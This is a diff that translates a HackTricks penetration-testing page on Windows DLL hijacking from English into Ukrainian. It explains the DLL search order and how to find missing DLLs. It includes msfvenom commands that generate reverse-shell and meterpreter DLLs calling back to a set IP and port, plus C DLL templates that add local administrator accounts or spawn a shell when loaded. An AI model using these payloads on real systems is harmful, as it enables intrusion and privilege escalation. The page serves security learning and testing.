@@ -1,187 +1,173 @@
-# Dll Hijacking
+# Викрадення DLL
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Підказка щодо багів у винагороді**: **зареєструйтеся** на **Intigriti**, преміальній **платформі для багів, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні, і почніть заробляти винагороди до **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
-## Basic Information
+## Основна інформація
 
-DLL Hijacking involves manipulating a trusted application into loading a malicious DLL. This term encompasses several tactics like **DLL Spoofing, Injection, and Side-Loading**. It's mainly utilized for code execution, achieving persistence, and, less commonly, privilege escalation. Despite the focus on escalation here, the method of hijacking remains consistent across objectives.
+Викрадення DLL включає маніпулювання довіреною програмою для завантаження шкідливої DLL. Цей термін охоплює кілька тактик, таких як **підробка, ін'єкція та бокове завантаження DLL**. Це використовується головним чином для виконання коду, досягнення постійності та, менш часто, підвищення привілеїв. Незважаючи на акцент на підвищенні привілеїв тут, метод викрадення залишається стійким незалежно від цілей.
 
-### Common Techniques
+### Загальні техніки
 
-Several methods are employed for DLL hijacking, each with its effectiveness depending on the application's DLL loading strategy:
+Для викрадення DLL використовуються кілька методів, кожен з яких має свою ефективність в залежності від стратегії завантаження DLL програми:
 
-1. **DLL Replacement**: Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.
-2. **DLL Search Order Hijacking**: Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.
-3. **Phantom DLL Hijacking**: Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.
-4. **DLL Redirection**: Modifying search parameters like `%PATH%` or `.exe.manifest` / `.exe.local` files to direct the application to the malicious DLL.
-5. **WinSxS DLL Replacement**: Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.
-6. **Relative Path DLL Hijacking**: Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.
+1. **Заміна DLL**: Заміна справжньої DLL на шкідливу, за необхідності використовуючи Підробку DLL для збереження функціональності оригінальної DLL.
+2. **Викрадення порядку пошуку DLL**: Розміщення шкідливої DLL у шляху пошуку перед законною, використовуючи шаблон пошуку програми.
+3. **Викрадення фантомної DLL**: Створення шкідливої DLL для завантаження програмою, вважаючи, що це невідома необхідна DLL.
+4. **Перенаправлення DLL**: Зміна параметрів пошуку, таких як `%PATH%` або файли `.exe.manifest` / `.exe.local`, щоб спрямувати програму на шкідливу DLL.
+5. **Заміна DLL у WinSxS**: Заміна законної DLL на шкідливий еквівалент у каталозі WinSxS, метод часто пов'язаний з боковим завантаженням DLL.
+6. **Викрадення DLL за відносним шляхом**: Розміщення шкідливої DLL у каталозі, котрий контролюється користувачем, разом з копійованою програмою, нагадуючи техніки виконання бінарних проксі.
 
-## Finding missing Dlls
+## Пошук відсутніх DLL
 
-The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:
+Найпоширеніший спосіб знайти відсутні DLL у системі - запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) від sysinternals, **встановивши** наступні **2 фільтри**:
 
 ![](<../../.gitbook/assets/image (311).png>)
 
 ![](<../../.gitbook/assets/image (313).png>)
 
-and just show the **File System Activity**:
+і просто показати **Активність файлової системи**:
 
 ![](<../../.gitbook/assets/image (314).png>)
 
-If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
-If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" "\<exec name>", execute it, and stop capturing events**.
+Якщо ви шукаєте **відсутні DLL загалом**, ви **залишаєте** це працюючим протягом декількох **секунд**.\
+Якщо ви шукаєте **відсутню DLL у конкретному виконуваному файлі**, вам слід встановити **інший фільтр, наприклад "Ім'я процесу" "містить" "\<ім'я виконуваного файлу>", виконати його і зупинити захоплення подій**.
 
-## Exploiting Missing Dlls
+## Використання відсутніх DLL
 
-In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.
+Для підвищення привілеїв найкращий шанс - мати можливість **записати DLL, яку привілейований процес спробує завантажити** в якомусь **місці, де її буде шукати**. Тому ми зможемо **записати** DLL у **каталозі**, де **DLL шукається перед** каталогом, де знаходиться **оригінальна DLL** (дивний випадок), або ми зможемо **записати у каталозі, де буде шукатися DLL**, а оригінальна **DLL не існує** у жодному каталозі.
 
-### Dll Search Order
+### Порядок пошуку DLL
 
-**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**
+У [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти, як саме завантажуються DLL**.
 
-**Windows applications** look for DLLs by following a set of **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.
+**Windows-додатки** шукають DLL, слідуючи набору **передбачених шляхів пошуку**, дотримуючись певної послідовності. Проблема викрадення DLL виникає, коли шкідлива DLL стратегічно розміщується в одному з цих каталогів, щоб гарантувати, що вона завантажиться перед автентичною DLL. Рішення для запобігання цьому - переконатися, що програма використовує абсолютні шляхи при посиланні на необхідні DLL.
 
-You can see the **DLL search order on 32-bit** systems below:
+Ви можете побачити **порядок пошуку DLL на 32-бітних** системах нижче:
 
-1. The directory from which the application loaded.
-2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
-3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
-4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
-   1. (_C:\Windows_)
-5. The current directory.
-6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
+1. Каталог, з якого завантажено додаток.
+2. Системний каталог. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати шлях до цього каталогу.(_C:\Windows\System32_)
+3. 16-бітний системний каталог. Немає функції, яка отримує шлях до цього каталогу, але він шукається. (_C:\Windows\System_)
+4. Каталог Windows. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати шлях до цього каталогу.
+1. (_C:\Windows_)
+5. Поточний каталог.
+6. Каталоги, які перераховані в змінній середовища PATH. Зверніть увагу, що це не включає шлях, вказаний для кожного додатка за допомогою ключа реєстру **App Paths**. Ключ **App Paths** не використовується при обчисленні шляху пошуку DLL.
 
-That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).
+Це **стандартний** порядок пошуку з увімкненим **SafeDllSearchMode**. Коли він вимкнений, поточний каталог піднімається на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** та встановіть його на 0 (за замовчуванням увімкнено).
 
-If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.
+Якщо [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, пошук починається в каталозі виконавчого модуля, який завантажує **LoadLibraryEx**.
 
-Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).
+На завершення, слід зауважити, що **DLL може бути завантажена, вказавши абсолютний шлях замість просто імені**. У цьому випадку DLL **буде шукатися лише в цьому шляху** (якщо у DLL є залежності, вони будуть шукатися за іменем, що їх завантажено).
 
-There are other ways to alter the ways to alter the search order but I'm not going to explain them here.
+Є інші способи змінити порядок пошуку, але я не буду пояснювати їх тут.
+#### Виключення у порядку пошуку DLL з документації Windows
 
-#### Exceptions on dll search order from Windows docs
+Деякі виключення зі стандартного порядку пошуку DLL відзначені в документації Windows:
 
-Certain exceptions to the standard DLL search order are noted in Windows documentation:
+* Коли зустрічається **DLL, яка має ту саму назву, що й одна з уже завантажених у пам'ять**, система обходить звичайний пошук. Замість цього вона виконує перевірку на перенаправлення та маніфест перед тим, як використовувати DLL, яка вже є в пам'яті. **У цьому випадку система не виконує пошук DLL**.
+* У випадках, коли DLL визнана як **відома DLL** для поточної версії Windows, система використовуватиме свою версію відомої DLL, разом з будь-якими залежними DLL, **пропускаючи процес пошуку**. Ключ реєстру **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих відомих DLL.
+* Якщо у DLL є **залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише за їх **іменами модулів**, незалежно від того, чи було початкову DLL ідентифіковано за повним шляхом.
 
-* When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
-* In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
-* Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.
+### Підвищення привілеїв
 
-### Escalating Privileges
+**Вимоги**:
 
-**Requirements**:
+* Визначте процес, який працює або буде працювати під **різними привілеями** (горизонтальний або бічний рух), якому **не вистачає DLL**.
+* Переконайтеся, що є **права на запис** для будь-якого **каталогу**, в якому буде **шукатися DLL**. Це може бути каталог виконавчого файлу або каталог у системному шляху.
 
-* Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
-* Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.
+Так, вимоги складно знайти, оскільки **за замовчуванням досить дивно знайти привілейований виконавчий файл, у якого відсутня DLL**, і ще **дивніше мати права на запис у каталозі системного шляху** (зазвичай цього не можна зробити). Але в неправильно налаштованих середовищах це можливо.\
+У випадку, якщо ви щасливчик і відповідаєте вимогам, ви можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проекту - обхід UAC**, ви там можете знайти **PoC** для перехоплення DLL для версії Windows, яку ви можете використовувати (імовірно, просто змінивши шлях каталогу, де у вас є права на запис).
 
-Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
-In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).
-
-Note that you can **check your permissions in a folder** doing:
-
+Зверніть увагу, що ви можете **перевірити свої дозволи в каталозі**, виконавши:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-
-And **check permissions of all folders inside PATH**:
-
+І **перевірте дозволи на всі папки всередині ШЛЯХУ**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-
-You can also check the imports of an executable and the exports of a dll with:
-
+Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-
-For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:
+Для повного посібника з **зловживання Dll Hijacking для підвищення привілеїв** з дозволом на запис у папці **System Path** перевірте:
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
 {% endcontent-ref %}
 
-### Automated tools
+### Автоматизовані інструменти
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
-Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи є у вас права на запис у будь-якій папці всередині системного шляху.\
+Інші цікаві автоматизовані інструменти для виявлення цієї вразливості - це функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._
 
-### Example
+### Приклад
 
-In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) or from[ **High Integrity to SYSTEM**](./#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.
+У випадку виявлення ситуації, яку можна використати для атаки, одним з найважливіших аспектів успішної експлуатації буде **створення dll, яка експортує принаймні всі функції, які виконуваний файл буде імпортувати з неї**. У будь-якому випадку, слід зауважити, що Dll Hijacking допомагає [підвищити рівень середовища від середнього до високого **(обхід UAC)**](../authentication-credentials-uac-and-efs.md#uac) або з [**високого рівня до SYSTEM**](./#from-high-integrity-to-system)**.** Ви можете знайти приклад **створення дійсної dll** у цьому дослідженні зосередженому на Dll Hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Більше того, у **наступному розділі** ви можете знайти деякі **основні коди dll**, які можуть бути корисними як **шаблони** або для створення **dll з експортом функцій, які не потрібні**.
 
-## **Creating and compiling Dlls**
+## **Створення та компіляція Dlls**
 
-### **Dll Proxifying**
+### **Проксіфікація Dll**
 
-Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.
+Основна ідея **проксі-бібліотеки Dll** полягає в тому, що вона може **виконувати ваш шкідливий код при завантаженні**, а також **виконувати** та **працювати** як **вимагається**, **перенаправляючи всі виклики до реальної бібліотеки**.
 
-With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.
+За допомогою інструментів [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете **вказати виконавчий файл та вибрати бібліотеку**, яку ви хочете проксіфікувати та **створити проксіфіковану dll** або **вказати Dll** та **створити проксіфіковану dll**.
 
 ### **Meterpreter**
 
-**Get rev shell (x64):**
-
+**Отримати обернену оболонку (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-
-**Get a meterpreter (x86):**
-
+**Отримати meterpreter (x86):**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-
-**Create a user (x86 I didn't see a x64 version):**
-
+**Створення користувача (x86 я не бачив версії x64):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
+### Ваш власний
 
-### Your own
-
-Note that in several cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.
-
+Зверніть увагу, що у декількох випадках Dll, який ви компілюєте, повинен **експортувати кілька функцій**, які будуть завантажені жертовним процесом, якщо ці функції не існують, **бінарний файл не зможе їх завантажити**, і **експлойт не вдасться**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
 #include <windows.h>
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
-    switch(dwReason){
-        case DLL_PROCESS_ATTACH:
-            system("whoami > C:\\users\\username\\whoami.txt");
-            WinExec("calc.exe", 0); //This doesn't accept redirections like system
-            break;
-        case DLL_PROCESS_DETACH:
-            break;
-        case DLL_THREAD_ATTACH:
-            break;
-        case DLL_THREAD_DETACH:
-            break;
-    }
-    return TRUE;
+switch(dwReason){
+case DLL_PROCESS_ATTACH:
+system("whoami > C:\\users\\username\\whoami.txt");
+WinExec("calc.exe", 0); //This doesn't accept redirections like system
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
 }
 ```
 
@@ -191,11 +177,11 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 #include <windows.h>
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
-    if (dwReason == DLL_PROCESS_ATTACH){
-        system("cmd.exe /k net localgroup administrators user /add");
-        ExitProcess(0);
-    }
-    return TRUE;
+if (dwReason == DLL_PROCESS_ATTACH){
+system("cmd.exe /k net localgroup administrators user /add");
+ExitProcess(0);
+}
+return TRUE;
 }
 ```
 
@@ -207,15 +193,15 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 int owned()
 {
-  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
-  exit(0);
-  return 0;
+WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
+exit(0);
+return 0;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 {
-  owned();
-  return 0;
+owned();
+return 0;
 }
 ```
 
@@ -228,44 +214,43 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 #include<stdio.h>
 
 void Entry (){ //Default function that is executed when the DLL is loaded
-    system("cmd");
+system("cmd");
 }
 
 BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call){
-        case DLL_PROCESS_ATTACH:
-            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
-            break;
-        case DLL_THREAD_ATTACH:
-        case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DEATCH:
-            break;
-    }
-    return TRUE;
+switch (ul_reason_for_call){
+case DLL_PROCESS_ATTACH:
+CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
+break;
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case DLL_PROCESS_DEATCH:
+break;
+}
+return TRUE;
 }
 ```
-
-## References
+## Посилання
 
 * [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 * [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Підказка щодо винагороди за виявлення помилок**: **зареєструйтесь** на **Intigriti**, преміальній **платформі для виявлення помилок, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні, і почніть заробляти винагороди до **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити свою **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв GitHub**.
 
 </details>
